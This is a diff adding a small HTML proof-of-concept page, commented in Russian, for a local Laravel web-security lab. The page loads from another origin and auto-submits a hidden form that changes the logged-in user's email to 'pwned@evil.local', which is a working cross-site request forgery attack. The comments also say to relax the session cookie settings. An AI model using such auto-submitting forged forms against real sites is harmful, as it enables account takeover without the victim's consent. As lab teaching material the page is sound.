@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<!--
+  Учебная страница «атакующего».
+  Будучи залогиненным в лабе на http://127.0.0.1:8000, откройте этот файл через другой origin:
+    npx serve -l 4000 .
+  затем http://127.0.0.1:4000/csrf-poc.html
+  В .env должны быть SESSION_SAME_SITE=none и SESSION_SECURE_COOKIE=false (см. websec-lab/.env).
+-->
+<html lang="ru">
+<head>
+  <meta charset="utf-8">
+  <title>CSRF PoC (учебный)</title>
+</head>
+<body>
+  <h1>Учебная страница атакующего</h1>
+  <p>Автоотправка формы на приложение Laravel…</p>
+  <form id="f" method="POST" action="http://127.0.0.1:8000/profile/email">
+    <input type="hidden" name="email" value="pwned@evil.local">
+  </form>
+  <script>document.getElementById('f').submit();</script>
+</body>
+</html>
